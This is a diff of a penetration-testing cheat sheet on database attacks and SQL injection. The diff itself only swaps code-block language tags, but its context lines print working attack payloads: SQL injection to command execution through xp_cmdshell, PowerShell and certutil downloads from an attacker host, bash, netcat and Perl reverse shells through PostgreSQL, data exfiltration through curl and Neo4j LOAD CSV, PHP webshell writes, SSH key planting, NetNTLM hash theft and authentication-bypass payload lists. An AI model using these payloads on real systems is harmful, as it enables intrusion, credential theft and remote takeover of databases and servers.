@@ -45,17 +45,17 @@
 
 ### Code Execution
 
-```c
+```console
 CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }$$;
 ```
 
-```c
+```console
 CALL EXECVE('id')
 ```
 
 ## Hibernate Query Language Injection (HQLi)
 
-```c
+```console
 uid=x' OR SUBSTRING(username,1,1)='m' and ''='&auth_primary=x&auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6
 ```
 
@@ -65,28 +65,28 @@ uid=x' OR SUBSTRING(username,1,1)='m' and ''='&auth_primary=x&auth_secondary=962
 
 ### Common Commands
 
-```c
+```console
 SQL> enum_logins
 SQL> enum_impersonate
 ```
 
 ### Connection
 
-```c
+```console
 $ impacket-mssqlclient <USERNAME>@<RHOST>
 $ impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
 $ impacket-mssqlclient -k -no-pass <RHOST>
 $ impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
 ```
 
-```c
+```console
 $ export KRB5CCNAME=<USERNAME>.ccache
 $ impacket-mssqlclient -k <RHOST>.<DOMAIN>
 ```
 
 ### Privilege Escalation
 
-```c
+```console
 SQL> exec_as_login sa
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
@@ -96,19 +96,19 @@ SQL> xp_cmdshell whoami
 
 ### Client Installation
 
-```c
+```console
 $ sudo apt-get install mongodb-clients
 ```
 
 ### Usage
 
-```c
+```console
 $ mongo "mongodb://localhost:27017"
 ```
 
 ### Common Commands
 
-```c
+```console
 > use <DATABASE>;
 > show tables;
 > show collections;
@@ -123,7 +123,7 @@ $ mongo "mongodb://localhost:27017"
 
 ### User Password Reset to "12345"
 
-```c
+```console
 > db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
 ```
 
@@ -131,12 +131,12 @@ $ mongo "mongodb://localhost:27017"
 
 > https://github.com/mdbtools/mdbtools
 
-```c
+```console
 => list tables     // show tables
 => go              // executes commands
 ```
 
-```c
+```console
 $ mdb-sql <FILE>
 ```
 
@@ -144,14 +144,14 @@ $ mdb-sql <FILE>
 
 ### Connection
 
-```c
+```console
 $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 $ impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
 ```
 
 ### Common Commands
 
-```c
+```console
 SELECT @@version;
 SELECT name FROM sys.databases;
 SELECT * FROM <DATABASE>.information_schema.tables;
@@ -160,33 +160,33 @@ SELECT * FROM <DATABASE>.dbo.users;
 
 ### Show Database Content
 
-```c
+```console
 1> SELECT name FROM master.sys.databases
 2> go
 ```
 
 ### OPENQUERY
 
-```c
+```console
 1> select * from openquery("web\clients", 'select name from master.sys.databases');
 2> go
 ```
 
-```c
+```console
 1> select * from openquery("web\clients", 'select name from clients.sys.objects');
 2> go
 ```
 
 ### Binary Extraction as Base64
 
-```c
+```console
 1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
 2> go > export.txt
 ```
 
 ### Steal NetNTLM Hash / Relay Attack
 
-```c
+```console
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 ```
 
@@ -194,7 +194,7 @@ SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 
 #### Common Commands
 
-```c
+```console
 SQL> enum_links
 SQL> EXECUTE('select @@servername, @@version') AT [<RHOST>];
 SQL> use_link [PRIMARY]
@@ -203,7 +203,7 @@ SQL> exec_as_login sa
 
 #### Advanced Enumeration
 
-```c
+```console
 SQL> SELECT user_name();
 SQL> SELECT name,sysadmin FROM syslogins;
 SQL> SELECT srvname,isremote FROM sysservers;
@@ -214,14 +214,14 @@ SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DO
 
 ### Python Code Execution
 
-```c
+```console
 SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'print( "foobar" );';
 SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami");';
 ```
 
 ### Register new Sysadmin User
 
-```c
+```console
 SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
 SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
 ```
@@ -230,7 +230,7 @@ SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') 
 
 #### Impersonate SA
 
-```c
+```console
 SQL> EXECUTE AS LOGIN = 'sa';
 SQL> EXEC sp_configure 'Show Advanced Options', 1; 
 SQL> RECONFIGURE; 
@@ -241,13 +241,13 @@ SQL> EXEC xp_cmdshell 'dir';
 
 #### Execute Script HTTP Server
 
-```c
+```console
 SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
 ```
 
 #### Start xp_cmdshell via MSSQL
 
-```c
+```console
 SQL> EXEC sp_configure 'Show Advanced Options', 1;
 SQL> reconfigure;
 SQL> sp_configure;
@@ -258,7 +258,7 @@ SQL> xp_cmdshell "whoami"
 
 ##### Alternative Way to start xp_cmdshell
 
-```c
+```console
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
 ```
@@ -267,19 +267,19 @@ SQL> xp_cmdshell whoami
 
 ##### Without Authentication
 
-```c
+```console
 SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> <OPTIONS>
 ```
 
 ##### With Authentication
 
-```c
+```console
 SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
 ```
 
 #### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) on a Logon Field
 
-```c
+```console
 ';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
 ';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
 ';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
@@ -287,15 +287,15 @@ SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSC
 
 #### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) in URL
 
-```c
+```console
 http://<RHOST>/index.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
 ```
 
-```c
+```console
 http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/<FILE>.exe C:\Windows\Temp\<FILE>.exe'; --
 ```
 
-```c
+```console
 http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
 ```
 
@@ -303,7 +303,7 @@ http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; -
 
 > https://www.mysqltutorial.org/mysql-cheat-sheet.aspx
 
-```c
+```console
 $ mysql -u root -p
 $ mysql -u <USERNAME> -h <RHOST> -p
 $ mysql -u <USERNAME> -h <RHOST> -p --skip-ssl
@@ -311,7 +311,7 @@ $ mysql -u <USERNAME> -h <RHOST> -p --skip-ssl
 
 ### Common Commands
 
-```c
+```console
 mysql> STATUS;
 mysql> SHOW databases;
 mysql> USE <DATABASE>;
@@ -328,20 +328,20 @@ mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
 
 ### Enumerate Version
 
-```c
+```console
 $ mysql -u root -p -e 'select @@version;'
 ```
 
 ### Skip SSL Verification
 
-```c
+```console
 $ mysql -h <RHOST> -u <USERNAME> --skip-ssl -p
 $ mysql -h <RHOST> -P <RPORT> -u <USERNAME> --skip-ssl -p
 ```
 
 ### Password Reset
 
-```c
+```console
 $ sudo systemctl stop mysql.service
 $ sudo mysqld_safe --skip-grant-tables &
 $ mysql -uroot
@@ -354,26 +354,26 @@ $ sudo systemctl start mysql.service
 
 > https://bcrypt-generator.com/
 
-```c
+```console
 mysql> UPDATE user SET password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
 mysql> UPDATE users SET password = '$2a$12$QvOBZ0r4tDdDCib4p8RKGudMk0VZKWBX21Dxh292NwrXwzwiuRIoG';
 ```
 
 ### Update User Privileges
 
-```c
+```console
 mysql> UPDATE user set is_admin = 1 where name = "<USERNAME>";
 ```
 
 ### Base64 Encoding
 
-```c
+```console
 mysql> SELECT TO_BASE64(password) FROM accounts where id = 1;
 ```
 
 ### Read a File
 
-```c
+```console
 mysql> SELECT LOAD_FILE('/etc/passwd');
 mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
 mysql> SELECT CAST(LOAD_FILE('/etc/passwd') AS CHAR)\G;
@@ -381,39 +381,39 @@ mysql> SELECT CAST(LOAD_FILE('/etc/passwd') AS CHAR)\G;
 
 ### User Privilege Check
 
-```c
+```console
 mysql> SELECT group_concat(grantee, ":",privilege_type) FROM information_schema.user_privileges
 ```
 
 ### File Privilege Check
 
-```c
+```console
 mysql> SELECT file_priv FROM mysql.user WHERE user = 'netspi'
 mysql> SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee LIKE '%netspi%'
 ```
 
 ### Drop a Shell
 
-```c
+```console
 mysql> \! sh;
 mysql> \! /bin/sh;
 ```
 
 ### Insert Code to get executed
 
-```c
+```console
 mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
 ```
 
 ### Write SSH Key into authorized_keys2 file
 
-```c
+```console
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
 ```
 
 ### Create Database
 
-```c
+```console
 MariaDB [(none)]> CREATE DATABASE <DATABASE>;
 Query OK, 1 row affected (0.001 sec)
 
@@ -436,30 +436,30 @@ Query OK, 0 rows affected (0.008 sec)
 
 ### Configure Remote Access
 
-```c
+```console
 $ sudo vi /etc/mysql/mariadb.conf.d/50-server.cnf
 ```
 
-```c
+```console
 # Instead of skip-networking the default is now to listen only on
 # localhost which is more compatible and is not less secure.
 #bind-address            = 127.0.0.1
 bind-address            = 0.0.0.0
 ```
 
-```c
+```console
 MariaDB [mysql]> FLUSH PRIVILEGES;
 MariaDB [mysql]> GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY '<PASSWORD>';
 ```
 
 ### Attach External Database
 
-```c
+```console
 $ sudo systemctl start mysql.service
 $ sqlite3
 ```
 
-```c
+```console
 sqlite> attach "Audit.db" as db1;
 sqlite> .databases
 main:
@@ -471,7 +471,7 @@ sqlite> SELECT ## FROM db1.DeletedUserAudit;
 
 ## mysqldump
 
-```c
+```console
 $ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space between parameter and input!
 ```
 
@@ -481,32 +481,32 @@ $ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space betw
 
 #### Enumerating Labels
 
-```c
+```console
 {"username":"' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as l RETURN 0 as _0 //","password":"foobar"}
 ```
 
 #### Enumerating Relationship Types
 
-```c
+```console
 {"username":"' OR 1=1 WITH 1 as a CALL db.relationshipTypes() YIELD relationshipType LOAD CSV FROM 'http://<LHOST>/?rel='+relationshipType as l RETURN 0 as _0 //","password":"user"}
 ```
 
 #### Enumerating Property Keys
 
-```c
+```console
 {"username":"' OR 1=1 WITH 1 as a CALL db.propertyKeys() YIELD propertyKey LOAD CSV FROM 'http://<LHOST>/?prop='+propertyKey as l RETURN 0 as _0 //","password":"user"}
 ```
 
 ## NoSQL Injection
 
-```c
+```console
 admin'||''==='
 {"username": {"$ne": null}, "password": {"$ne": null} }
 ```
 
 ### Bruteforce Values
 
-```c
+```console
 import requests
 import re
 import string
@@ -539,7 +539,7 @@ while not done:
 
 ## PostgreSQL
 
-```c
+```console
 $ psql
 $ psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
 $ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
@@ -548,7 +548,7 @@ $ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 
 ### Common Commands
 
-```c
+```console
 postgres=# \l                        // list all databases
 postgres=# \list                     // list all databases
 postgres=# \c                        // use database
@@ -572,13 +572,13 @@ postgres=# \q                        // quit
 
 > https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program
 
-```c
+```console
 <DATABASE>=# x'; COPY (SELECT '') TO PROGRAM 'curl http://<LHOST>?f=`whoami|base64`'-- x
 ```
 
 or
 
-```c
+```console
 <DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
 <DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
 <DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
@@ -590,19 +590,19 @@ or
 
 Notice that in order to scape a single quote you need to put `2 single` quotes.
 
-```c
+```console
 <DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';
 ```
 
 or
 
-```c
+```console
 <DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
 #### File Write
 
-```c
+```console
 <DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
 ```
 
@@ -610,11 +610,11 @@ or
 
 ##### Reverse Shell
 
-```c
+```console
 <DATABASE>=# EXECUTE CHR(67)||CHR(82)||CHR(69)||CHR(65)||CHR(84)||CHR(69)||' TABLE shell(output text);'
 ```
 
-```c
+```console
 DO $$
 DECLARE
     c text;
@@ -627,14 +627,14 @@ END $$;
 
 ## Redis
 
-```c
+```console
 $ redis-cli -h <RHOST>
 $ redis-cli -s /run/redis/redis.sock
 ```
 
 ### Common Commands
 
-```c
+```console
 > AUTH <PASSWORD>
 > AUTH <USERNAME> <PASSWORD>
 > INFO SERVER
@@ -654,7 +654,7 @@ $ redis-cli -s /run/redis/redis.sock
 
 ##### Add User
 
-```c
+```console
 redis /run/redis/redis.sock> HSET barfoo username foobar
 redis /run/redis/redis.sock> HSET barfoo first-name foo
 redis /run/redis/redis.sock> HSET barfoo last-name bar
@@ -663,7 +663,7 @@ redis /run/redis/redis.sock> HGETALL barfoo
 
 ##### Retrieve a specific Value
 
-```c
+```console
 redis /run/redis/redis.sock> KEYS *
 redis /run/redis/redis.sock> SELECT 1
 redis /run/redis/redis.sock> TYPE <VALUE>
@@ -673,7 +673,7 @@ redis /run/redis/redis.sock> HGET <VALUE> password
 
 ### Enter own SSH Key
 
-```c
+```console
 $ redis-cli -h <RHOST>
 $ echo "FLUSHALL" | redis-cli -h <RHOST>
 $ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
@@ -697,13 +697,13 @@ OK
 
 ### Write to File
 
-```c
+```console
 SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/PATH/TO/FILE/<FILE>'
 ```
 
 ## sqlcmd
 
-```c
+```console
 $ sqlcmd -S <RHOST> -U <USERNAME>
 $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 ```
@@ -716,7 +716,7 @@ $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 
 ### Comments
 
-```c
+```console
 #       // Hash comment
 /*      // C-style comment
 -- -    // SQL comment
@@ -737,7 +737,7 @@ $ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
 
 ### Master List
 
-```c
+```console
 ';#---
 admin' or '1'='1
 ' or '1'='1
@@ -765,7 +765,7 @@ admin' or '1'='1
 
 ### Authentication Bypass
 
-```c
+```console
 '-'
 ' '
 '&'
@@ -866,7 +866,7 @@ admin") or "1"="1"/*
 
 ### Testing APIs
 
-```c
+```console
 {"id":"56456"}                   // ok
 {"id":"56456 AND 1=1#"}          // ok
 {"id":"56456 AND 1=2#"}          // ok
@@ -876,17 +876,17 @@ admin") or "1"="1"/*
 
 ### Payload Examples
 
-```c
+```console
 SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWORD>';
 ```
 
-```c
+```console
 1%27/**/%256fR/**/50%2521%253D22%253B%2523=="0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z",===query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login==' AND (SELECT 8871 FROM (SELECT(SLEEP(5)))uZxz)
 ```
 
 #### Explanation
 
-```c
+```console
 1=1    // is always true
 --     // comment
 -      // special character at the end just because of sql
@@ -898,56 +898,56 @@ SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWO
 
 ##### Get Number of Columns
 
-```c
+```console
 -1 order by 3;#
 ```
 
 ##### Get Version
 
-```c
+```console
 -1 union select 1,2,version();#
 ```
 
 ##### Get Database Name
 
-```c
+```console
 -1 union select 1,2,database();#
 ```
 
 ##### Get Table Name
 
-```c
+```console
 -1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
 ```
 
 ##### Get Column Name
 
-```c
+```console
 -1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
 ```
 
 ##### Read a File
 
-```c
+```console
 SELECT LOAD_FILE('/etc/passwd')
 ```
 
 ##### Dump Data
 
-```c
+```console
 -1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
 ```
 
 ##### Create Webshell
 
-```c
+```console
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
 select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
 ```
 
 or
 
-```c
+```console
 LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
 ```
@@ -956,25 +956,25 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 
 ##### Authentication Bypass
 
-```c
+```console
 ' or 1=1--
 ```
 
 ##### Get Version with Time-Based Injection
 
-```c
+```console
 ' SELECT @@version; WAITFOR DELAY '00:00:10'; —
 ```
 
 ##### Enable xp_cmdshell
 
-```c
+```console
 ' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
 ```
 
 ##### Remote Code Execution (RCE)
 
-```c
+```console
 ' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
 ```
 
@@ -982,31 +982,31 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 
 ##### Authentication Bypass
 
-```c
+```console
 ' or 1=1--
 ```
 
 ##### Get Number of Columns
 
-```c
+```console
 ' order by 3--
 ```
 
 ##### Get Table Name
 
-```c
+```console
 ' union select null,table_name,null from all_tables--
 ```
 
 ##### Get Column Name
 
-```c
+```console
 ' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
 ```
 
 ##### Dump Data
 
-```c
+```console
 ' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
 ```
 
@@ -1014,29 +1014,29 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 
 ##### Extracting Table Names
 
-```c
+```console
 http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
 ```
 
 ##### Extracting User Table
 
-```c
+```console
 http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
 ```
 
 ### Error-based SQL Injection (SQLi)
 
-```c
+```console
 <USERNAME>' OR 1=1 -- //
 ```
 
 Results in:
 
-```c
+```console
 SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
 ```
 
-```c
+```console
 ' or 1=1 in (select @@version) -- //
 ' OR 1=1 in (SELECT * FROM users) -- //
 ' or 1=1 in (SELECT password FROM users) -- //
@@ -1047,37 +1047,37 @@ SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
 
 #### Manual Injection Steps
 
-```c
+```console
 $query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
 ```
 
-```c
+```console
 ' ORDER BY 1-- //
 ```
 
-```c
+```console
 %' UNION SELECT database(), user(), @@version, null, null -- //
 ```
 
-```c
+```console
 ' UNION SELECT null, null, database(), user(), @@version  -- //
 ```
 
-```c
+```console
 ' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
 ```
 
-```c
+```console
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
 
 ### Blind SQL Injection (SQLi)
 
-```c
+```console
 http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
 ```
 
-```c
+```console
 http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
 ```
 
@@ -1085,7 +1085,7 @@ http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
 
 #### Skeleton Payload
 
-```c
+```console
 SELECT ? FROM ? WHERE ? LIKE '%amme%';    // control over amme
 SELECT ? FROM ? WHERE ? LIKE '%'%';       // errors out because of the single quote
 SELECT ? FROM ? WHERE ? LIKE '%';-- %';   // wildcard wich equals = ';--
@@ -1096,7 +1096,7 @@ SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT 1,2,3 FROM dual);-- %';
 - JOIN = merging columns 1 by 1
 - UNION = appending
 
-```c
+```console
 SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3) FROM information_schema.tables;-- %';    // information_schema.tables is an information table
 SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT COLUMN_NAME, 2,3 FROM information_schema.columns WHERE TABLE_NAME = 'users');-- %';
 SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FROM users);-- %';
@@ -1106,7 +1106,7 @@ SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FR
 
 > https://<RHOST>/article?id=3
 
-```c
+```console
 '    # causes error printed out on the page
 1 UNION SELECT 1
 1 UNION SELECT 1,2
@@ -1122,7 +1122,7 @@ SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FR
 
 > https://<RHOST>/article?id=3
 
-```c
+```console
 0 SELECT * FROM users WHERE username='%username%' AND password='%password%' LIMIT 1;
 ```
 
@@ -1130,7 +1130,7 @@ SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FR
 
 > https://<RHOST>/checkuser?username=admin
 
-```c
+```console
 admin123' UNION SELECT 1;--    # value is false
 admin123' UNION SELECT 1,2;--    # value is false
 admin123' UNION SELECT 1,2,3;--    # value changed to true
@@ -1153,7 +1153,7 @@ admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password
 
 > https://<RHOST>/analytics?referrer=<RHOST>
 
-```c
+```console
 admin123' UNION SELECT SLEEP(5);--
 admin123' UNION SELECT SLEEP(5),2;--    # the query created a 5 second delay which indicates that it was successful
 admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'u%';--
@@ -1167,7 +1167,7 @@ admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password
 
 ### SQL Command Injection
 
-```c
+```console
 $ ls -l&host=/var/www
 $ command=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'%26host=
 ```
@@ -1176,13 +1176,13 @@ $ command=bash+-c+'bash+-i+>%26+/dev/tcp/<LHOST>/<LPORT>+0>%261'%26host=
 
 > https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html
 
-```c
+```console
 'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb' (URL encoded instead of spaces)
 ```
 
 ### SQL UNION Injection
 
-```c
+```console
 foobar" UNION SELECT NULL, NULL, @@hostname, @@version; #
 foobar" UNION SELECT NULL, NULL, NULL, SCHEMA_NAME FROM information_schema.SCHEMATA; #
 foobar" UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
@@ -1190,55 +1190,55 @@ foobar" UNION SELECT 1, user, password, authentication_string FROM mysql.user; #
 
 ### List Tables
 
-```c
+```console
 UNION SELECT 1,table_name,3,4 FROM information_schema.tables;
 ```
 
 ### List Columns
 
-```c
+```console
 UNION SELECT 1,column_name,3,4 FROM information_schema.columns;
 ```
 
 ### Username and Password Fields
 
-```c
+```console
 UNION SELECT 1,concat(login,':',password),3,4 FROM users;
 ```
 
 ### Example of UNION Injection with enumerating information_schema
 
-```c
+```console
 SELECT group_concat(table_name,":",column_name,"\n") FROM information_schema.columns where table_schema = 'employees'
 ```
 
 ### URL Encoded SQL Injection
 
-```c
+```console
 http://<RHOST>/database.php?id=1%20UNION%20SELECT%201,concat%28table_name,%27:%27,%20column_name%29%20FROM%20information_schema.columns
 ```
 
 ### File Read
 
-```c
+```console
 uname=foo' UNION ALL SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL,NULL; -- &password=bar
 ```
 
 ### Dump to File
 
-```c
+```console
 SELECT ## FROM <TABLE> INTO dumpfile '/PATH/TO/FILE'
 ```
 
 ### Dump PHP Shell
 
-```c
+```console
 SELECT 'system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php'
 ```
 
 ### Read File Obfuscation
 
-```c
+```console
 SELECT LOAD_FILE(0x633A5C626F6F742E696E69)    // reads C:\boot.ini
 ```
 
@@ -1246,7 +1246,7 @@ SELECT LOAD_FILE(0x633A5C626F6F742E696E69)    // reads C:\boot.ini
 
 #### Check Server Version
 
-```c
+```console
 ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions
 as version LOAD CSV FROM 'http://<LHOST>/?version=' + version + '&name=' + name + '&edition=' + edition as
 l RETURN 0 as _0 //
@@ -1254,14 +1254,14 @@ l RETURN 0 as _0 //
 
 #### Get Label
 
-```c
+```console
 ' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as
 l RETURN 0 as _0 //
 ```
 
 #### Get Key Properties
 
-```c
+```console
 ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://<LHOST>/?' + p
 +'='+toString(f[p]) as l RETURN 0 as _0 //
 ```
@@ -1270,13 +1270,13 @@ l RETURN 0 as _0 //
 
 ## sqlite3
 
-```c
+```console
 $ sqlite3 <FILE>.db
 ```
 
 ### Common Commands
 
-```c
+```console
 sqlite> .tables
 sqlite> PRAGMA table_info(<TABLE>);
 sqlite> SELECT * FROM <TABLE>;
@@ -1284,7 +1284,7 @@ sqlite> SELECT * FROM <TABLE>;
 
 ### Table Example
 
-```c
+```console
 $ sqlite3 <DATABASE>.db ".tables"
 $ sqlite3 <DATABASE>.db ".schema <TABLE>"
 $ sqlite3 <DATABASE>.db "SELECT * FROM <TABLE>;"
@@ -1294,12 +1294,12 @@ $ sqlite3 <DATABASE>.db "SELECT * FROM <TABLE>;"
 
 > https://github.com/sqlmapproject/sqlmap
 
-```c
+```console
 --batch         // don't ask any questions
 --current-db    // dumps database
 ```
 
-```c
+```console
 $ sqlmap --list-tampers
 $ sqlmap -r <FILE>.req --level 5 --risk 3 --threads 10
 $ sqlmap -r <FILE>.req --level 5 --risk 3 --tables
@@ -1316,25 +1316,25 @@ $ sqlmap -r <FILE>.req  --dbs -D <DATABASE> -T <TABLE> -C id,is_staff,username,p
 
 ### Web Application Firewall (WAF) Bypass
 
-```c
+```console
 $ sqlmap -u 'http://<RHOST>/search.cmd?form_state=1' --level=5 --risk=3 tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
 ```
 
 ### Using Cookies
 
-```c
+```console
 $ sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
 ```
 
 ### Using Flask Token
 
-```c
+```console
 $ sqlmap http://<RHOST>/ --eval="FROM flask_unsign import session as s; session = s.sign({'uuid': session}, secret='<SECRET_KEY>')" --cookie="session=*" --delay 1 --dump
 ```
 
